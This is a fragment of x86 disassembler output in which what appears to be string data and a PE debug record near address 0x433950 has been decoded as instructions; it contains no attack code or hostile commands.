  4338eb:	inc    edx
  4338ec:	add    BYTE PTR [edi+0x0],bl
  4338ef:	push   ecx
  4338f0:	add    BYTE PTR [ecx+0x0],bl
  4338f3:	dec    edi
  4338f4:	add    BYTE PTR [eax+0x0],dl
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	dec    edx
  4338fa:	add    BYTE PTR [ecx+0x0],dl
  4338fd:	inc    esp
  4338fe:	add    BYTE PTR [edi+0x0],bl
  433901:	dec    edx
  433902:	add    BYTE PTR [eax],dh
  433904:	add    BYTE PTR [ecx],dh
  433906:	add    BYTE PTR [ebx+0x0],dl
  433909:	push   ecx
  43390a:	add    BYTE PTR [ecx],dh
  43390c:	add    BYTE PTR [edi+0x0],bl
  43390f:	push   edi
  433910:	add    BYTE PTR [eax],al
  433912:	add    BYTE PTR [ebx+0x0],cl
  433915:	pop    edx
  433916:	add    BYTE PTR [esi],dh
  433918:	add    BYTE PTR [edi+0x0],bl
  43391b:	inc    ebx
  43391c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433920:	add    BYTE PTR [edi+0x0],bl
  433923:	push   edi
  433924:	add    BYTE PTR [ebx],dh
  433926:	add    BYTE PTR [esi+0x0],cl
  433929:	push   ebp
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	dec    edx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],dl
  433933:	aaa    
  433934:	add    BYTE PTR [eax],bh
  433936:	add    BYTE PTR [edi+0x0],bl
  433939:	pop    eax
  43393a:	add    BYTE PTR [edi+0x0],cl
  43393d:	inc    edi
  43393e:	add    BYTE PTR [edi+0x0],bl
  433941:	xor    al,0x0
  433943:	push   eax
  433944:	add    BYTE PTR [ecx+0x0],cl
  433947:	push   ebp
  433948:	add    BYTE PTR [eax],al
  43394a:	add    BYTE PTR [edi+0x0],dl
  43394d:	push   esp
  43394e:	add    BYTE PTR [ebx+0x0],cl
  433951:	add    BYTE PTR [eax],al
  433953:	add    BYTE PTR [edx+0x53],dl
  433956:	inc    esp
  433957:	push   ebx
  433958:	popf   
  433959:	ficomp WORD PTR [esi+0x34e6a706]
  43395f:	dec    esi
  433960:	popf   
  433961:	fnstsw WORD PTR [eax+0x4a]
  433964:	scas   eax,DWORD PTR es:[edi]
  433965:	nop
  433966:	add    al,0x21
  433968:	sbb    eax,DWORD PTR [eax]
  43396a:	add    BYTE PTR [eax],al
  43396c:	push   esp
  43396d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433971:	addr16 push edi
  433973:	bound  bx,DWORD PTR [edx+0x45]
  433977:	outs   dx,BYTE PTR ds:[esi]
  433978:	pop    esp
  433979:	je     0x4339ee
  43397b:	ja     0x4339be
  43397d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433985:	js     0x4339f6
  433987:	jp     0x4339f8
  433989:	jns    0x4339ef
  43398b:	jp     0x4339f5
  43398d:	je     0x4339f3
  43398f:	jp     0x4339f3
  433991:	cs jo  0x4339f8
  433994:	bound  eax,QWORD PTR [eax]
	...
